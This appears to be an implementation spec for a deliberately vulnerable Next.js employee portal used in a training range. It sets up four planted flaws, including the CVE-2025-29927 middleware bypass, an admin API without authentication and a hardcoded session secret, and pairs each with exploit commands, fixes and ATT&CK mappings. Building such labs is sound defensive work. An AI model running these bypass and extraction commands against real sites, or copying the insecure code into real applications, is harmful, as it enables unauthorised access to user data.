# Next.js Employee Portal — Implementation Spec

**Date:** 2026-04-14
**Status:** Implementation-ready
**Parent spec:** `2026-04-13-module-expansion-design.md`

---

## Overview

A Next.js 14.1.0 employee portal application, pre-built and deployed as a production build. Runs on port 3001 as a systemd service. The pinned Next.js version is affected by CVE-2025-29927 (middleware authentication bypass). Introduces 4 vulnerabilities covering the CVE, an unprotected admin API route, exposed source maps, and a hardcoded session secret.

| Field | Value |
|-------|-------|
| Port | 3001 |
| Runtime | Node.js 20 LTS + Next.js 14.1.0 (pre-built) |
| Path | `modules/application_external/nextjs_portal/` |
| Service user | `portal` |
| Install dir | `/opt/portal/` |

---

## Directory Structure

```
modules/application_external/nextjs_portal/
├── nextjs_portal.yaml
├── setup.sh
├── finalize.sh
├── portal.service
├── src/                          # Next.js source (build ahead of time)
│   ├── package.json              # pins next@14.1.0
│   ├── next.config.js
│   ├── middleware.ts             # auth middleware (bypassable via CVE)
│   ├── app/
│   │   ├── layout.tsx
│   │   ├── page.tsx             # public homepage
│   │   ├── dashboard/
│   │   │   └── page.tsx         # protected, requires session
│   │   └── api/
│   │       └── admin/
│   │           └── users/
│   │               └── route.ts # admin API (vuln: missing auth check)
│   └── ...
├── bin/
│   └── portal-build/            # pre-built Next.js output (next build)
│       ├── .next/
│       ├── public/
│       └── package.json
└── vulns/
    ├── nextjs_middleware_bypass/
    │   ├── nextjs_middleware_bypass.yaml
    │   └── nextjs_middleware_bypass.sh
    ├── nextjs_unprotected_api/
    │   ├── nextjs_unprotected_api.yaml
    │   └── nextjs_unprotected_api.sh
    ├── nextjs_source_maps/
    │   ├── nextjs_source_maps.yaml
    │   └── nextjs_source_maps.sh
    └── nextjs_hardcoded_secret/
        ├── nextjs_hardcoded_secret.yaml
        └── nextjs_hardcoded_secret.sh
```

---

## Module Definitions

### Parent: `nextjs_portal.yaml`

```yaml
id: nextjs_portal
name: Next.js Employee Portal
description: A Next.js 14.1.0 employee portal with authentication middleware and an admin API. Pre-built and deployed to /opt/portal/. Runs on port 3001 as a systemd service.
type: application_external
difficulty: hard
points: 0
category: web
tags: [web, nodejs, nextjs, react, employee-portal]
conflicts: []
requires: []
script: setup.sh
verification:
  type: process_running
  process: "0.0.0.0:3001"
  expected: running
hints:
  - "Check what web applications are running on higher port numbers"
```

---

### Vuln 1: `nextjs_middleware_bypass.yaml`

```yaml
id: nextjs_middleware_bypass
name: Middleware Auth Bypass (CVE-2025-29927)
description: Next.js 14.1.0 is affected by CVE-2025-29927. The middleware authentication check can be bypassed by setting the x-middleware-subrequest header, granting unauthenticated access to all protected routes. The fix is to upgrade to a patched Next.js version.
type: vulnerability
difficulty: hard
points: 300
category: web
tags: [cve, nextjs, authentication-bypass, middleware, web]
conflicts: []
requires: [nextjs_portal]
script: nextjs_middleware_bypass.sh
verification:
  type: file_not_contains
  path: /opt/portal/package.json
  pattern: '"next": "14.1.0"'
suggested_fix: "Update Next.js to a patched version (>=14.2.25 or >=15.2.3): edit /opt/portal/package.json to change the next version, run npm install in /opt/portal, then restart the service: systemctl restart portal"
hints:
  - "Check the Next.js version installed in the portal application"
  - "Look up CVE-2025-29927 — it affects Next.js middleware authentication"
  - "Update the 'next' version in /opt/portal/package.json to 14.2.25 or later, run npm install, rebuild with next build, and restart the portal service"
caldera:
  tactic: initial-access
  technique:
    attack_id: T1190
    name: "Exploit Public-Facing Application"
  recon:
    description: "Check if Next.js version is affected by CVE-2025-29927"
    command: |
      grep -q '"next": "14.1.0"' /opt/portal/package.json && echo "VULNERABLE: Next.js 14.1.0 is affected by CVE-2025-29927" || echo "SECURE: Next.js version appears patched"
  exploit:
    description: "Bypass middleware authentication using CVE-2025-29927"
    command: |
      curl -s -H "x-middleware-subrequest: middleware" http://localhost:3001/dashboard | grep -i "employee\|dashboard\|welcome" | head -5
      echo "Auth bypass attempted — check response for protected content"
```

---

### Vuln 2: `nextjs_unprotected_api.yaml`

```yaml
id: nextjs_unprotected_api
name: Admin API Route Unprotected
description: The admin API route at /api/admin/users returns all user records without verifying the caller's session. Any unauthenticated request receives the full user list.
type: vulnerability
difficulty: medium
points: 200
category: web
tags: [authentication, api, nextjs, web, information-disclosure]
conflicts: []
requires: [nextjs_portal]
script: nextjs_unprotected_api.sh
verification:
  type: file_contains
  path: /opt/portal/app/api/admin/users/route.ts
  pattern: "getServerSession"
suggested_fix: "Add a session check at the top of the GET handler in /opt/portal/app/api/admin/users/route.ts using getServerSession(). If the session is null, return a 401 response. Then rebuild the app and restart the service."
hints:
  - "Check the admin API endpoints for authentication controls"
  - "Review /opt/portal/app/api/admin/users/route.ts for missing session verification"
  - "Add a getServerSession() check at the start of the GET handler — return NextResponse.json({error:'Unauthorized'},{status:401}) if the session is null. Rebuild and restart."
caldera:
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  recon:
    description: "Check if the admin users API is accessible without authentication"
    command: |
      HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3001/api/admin/users)
      [ "$HTTP_CODE" = "200" ] && echo "VULNERABLE: /api/admin/users accessible without auth (HTTP $HTTP_CODE)" || echo "SECURE: /api/admin/users returned HTTP $HTTP_CODE"
  exploit:
    description: "Dump all user records from the unprotected admin API"
    command: |
      curl -s http://localhost:3001/api/admin/users | python3 -m json.tool
```

---

### Vuln 3: `nextjs_source_maps.yaml`

```yaml
id: nextjs_source_maps
name: Source Maps Exposed in Production
description: The Next.js production build is configured with productionBrowserSourceMaps: true in next.config.js, causing the full TypeScript source code to be served as .js.map files alongside the compiled JavaScript.
type: vulnerability
difficulty: easy
points: 100
category: web
tags: [information-disclosure, nextjs, source-maps, web, configuration]
conflicts: []
requires: [nextjs_portal]
script: nextjs_source_maps.sh
verification:
  type: file_not_contains
  path: /opt/portal/next.config.js
  pattern: "productionBrowserSourceMaps: true"
suggested_fix: "Edit /opt/portal/next.config.js and remove or set productionBrowserSourceMaps: false, then rebuild the app (next build) and restart the service"
hints:
  - "Check the Next.js build configuration for source map settings"
  - "Look for productionBrowserSourceMaps in /opt/portal/next.config.js"
  - "Remove or set productionBrowserSourceMaps: false in next.config.js, rebuild with next build, and restart the portal service"
caldera:
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  recon:
    description: "Check if production source maps are enabled"
    command: |
      grep -q "productionBrowserSourceMaps: true" /opt/portal/next.config.js && echo "VULNERABLE: source maps enabled in production" || echo "SECURE: source maps not exposed in production"
  exploit:
    description: "Access source map files to read original TypeScript source"
    command: |
      curl -s "http://localhost:3001/_next/static/chunks/app/page.js.map" | python3 -m json.tool | grep -i "sources\|sourcesContent" | head -5
      echo "Source code exposed via .map files"
```

---

### Vuln 4: `nextjs_hardcoded_secret.yaml`

```yaml
id: nextjs_hardcoded_secret
name: Hardcoded Session Secret
description: The systemd service unit file sets NEXTAUTH_SECRET=super-secret-dev-key as a plaintext environment variable, allowing any user who can read the unit file to forge session tokens for any user including admins.
type: vulnerability
difficulty: easy
points: 100
category: authentication
tags: [hardcoded-credentials, authentication, nextjs, nextauth]
conflicts: []
requires: [nextjs_portal]
script: nextjs_hardcoded_secret.sh
verification:
  type: file_not_contains
  path: /etc/systemd/system/portal.service
  pattern: "super-secret-dev-key"
suggested_fix: "Generate a strong random secret (openssl rand -base64 32) and update NEXTAUTH_SECRET in /etc/systemd/system/portal.service to the new value, then run: systemctl daemon-reload && systemctl restart portal"
hints:
  - "Review the systemd service unit for hardcoded credential strings"
  - "Check the NEXTAUTH_SECRET value in /etc/systemd/system/portal.service"
  - "Replace the hardcoded secret with a strong random value (openssl rand -base64 32), reload the daemon, and restart the portal service"
caldera:
  tactic: credential-access
  technique:
    attack_id: T1552.001
    name: "Unsecured Credentials: Credentials In Files"
  recon:
    description: "Check if a default session secret is hardcoded in the service unit"
    command: |
      grep -q "super-secret-dev-key" /etc/systemd/system/portal.service && echo "VULNERABLE: hardcoded session secret found" || echo "SECURE: no default session secret detected"
  exploit:
    description: "Extract the session secret and forge an admin session token"
    command: |
      SECRET=$(grep "NEXTAUTH_SECRET" /etc/systemd/system/portal.service | grep -oP "(?<==)[^\s]+")
      echo "Session secret: $SECRET"
      echo "With this secret, session JWTs can be forged for any user account"
```

---

## Setup Scripts

### `setup.sh`

1. Install Node.js 20 via NodeSource — idempotent, safe if `notes_api` already installed it.
2. Create `portal` system user: `useradd -r -s /bin/false portal`
3. Create `/opt/portal/`.
4. Copy the pre-built `bin/portal-build/` contents to `/opt/portal/` (`.next/`, `public/`, `package.json`, `next.config.js`, `app/`).
5. Run `npm install --omit=dev` in `/opt/portal/` to install production runtime deps.
6. Copy `portal.service` to `/etc/systemd/system/portal.service`.

### `finalize.sh`

1. `chown -R portal:portal /opt/portal/`
2. `chmod 640 /opt/portal/next.config.js`
3. `systemctl daemon-reload && systemctl enable --now portal`

---

## Application Source (`src/`)

A minimal Next.js 14.1.0 app with App Router:

**Routes:**

| Path | Auth required | Description |
|------|--------------|-------------|
| `/` | No | Public homepage with login link |
| `/dashboard` | Yes (middleware) | Employee dashboard showing user info |
| `/api/auth/[...nextauth]` | No | NextAuth.js authentication endpoints |
| `/api/admin/users` | Should be yes (vuln: no) | Returns all user records |

**`middleware.ts`** — uses NextAuth's `withAuth` to protect `/dashboard` and `/api/admin/**` routes. The vulnerability is the Next.js 14.1.0 version itself — `x-middleware-subrequest` bypasses the middleware entirely.

**`app/api/admin/users/route.ts`** (vulnerable baseline):
```typescript
import { NextResponse } from 'next/server'
import { users } from '@/lib/data'

export async function GET() {
  // Missing: const session = await getServerSession(authOptions)
  // Missing: if (!session) return NextResponse.json({error:'Unauthorized'},{status:401})
  return NextResponse.json(users)
}
```

**`next.config.js`** (secure baseline):
```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  // productionBrowserSourceMaps: false (default)
}
module.exports = nextConfig
```

---

## `portal.service`

```ini
[Unit]
Description=Next.js Employee Portal
After=network.target

[Service]
Type=simple
User=portal
WorkingDirectory=/opt/portal
Environment=NODE_ENV=production
Environment=PORT=3001
Environment=NEXTAUTH_URL=http://localhost:3001
Environment=NEXTAUTH_SECRET=super-secret-dev-key
ExecStart=/usr/bin/node node_modules/.bin/next start -p 3001
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

---

## Vuln Scripts

| Script | What it does |
|--------|-------------|
| `nextjs_middleware_bypass.sh` | No-op — the vulnerability is the pinned version. Script verifies the version string remains `14.1.0` in `package.json` (it was installed this way). No action needed; the parent `setup.sh` already installed the vulnerable version. |
| `nextjs_unprotected_api.sh` | Removes the `getServerSession` import and check from `app/api/admin/users/route.ts`, then restarts portal. Because the pre-built `.next/` is deployed, the script must also rebuild: `cd /opt/portal && node_modules/.bin/next build && systemctl restart portal`. |
| `nextjs_source_maps.sh` | Adds `productionBrowserSourceMaps: true` to `next.config.js`, rebuilds, restarts portal. |
| `nextjs_hardcoded_secret.sh` | No-op — `super-secret-dev-key` is already in `portal.service` (the default unit). The script just verifies the string is present. |

**Note:** Vuln scripts that require `next build` will take 60–90 seconds on a small VPS. This is acceptable for Ansible playbook deployment but should be noted when sizing plan execution timeouts.

---

## Verification Checklist

1. **nextjs_portal**: Run `setup.sh` + `finalize.sh` → `curl -s -o /dev/null -w "%{http_code}" http://localhost:3001/` → 200. `ss -tlnp | grep 3001` → listening.
2. **nextjs_middleware_bypass**: Check `grep '"next": "14.1.0"' /opt/portal/package.json` → found. Fix: update to `14.2.25`, `npm install`, rebuild, restart → string no longer `14.1.0`.
3. **nextjs_unprotected_api**: `curl -s -o /dev/null -w "%{http_code}" http://localhost:3001/api/admin/users` → 200. Fix: add `getServerSession` check, rebuild → 401 without session.
4. **nextjs_source_maps**: `grep productionBrowserSourceMaps /opt/portal/next.config.js` → `true`. Fix: remove or set `false`, rebuild → source map files return 404.
5. **nextjs_hardcoded_secret**: `grep super-secret-dev-key /etc/systemd/system/portal.service` → found. Fix: replace with random secret, daemon-reload, restart → string no longer present.

---

## Port / Conflict Notes

- Port 3001 is not used by any existing module. Port 3000 (notes_api) is distinct.
- Node.js 20 installation is idempotent — safe if `notes_api` is also selected.
- The `src/` directory, `package.json`, and build step exist only in the module repo. Only `bin/portal-build/` is copied to the target VM.
- Vuln scripts that trigger `next build` are slow (~60–90s) — account for this in Ansible task timeouts.
- No file path conflicts with existing modules.
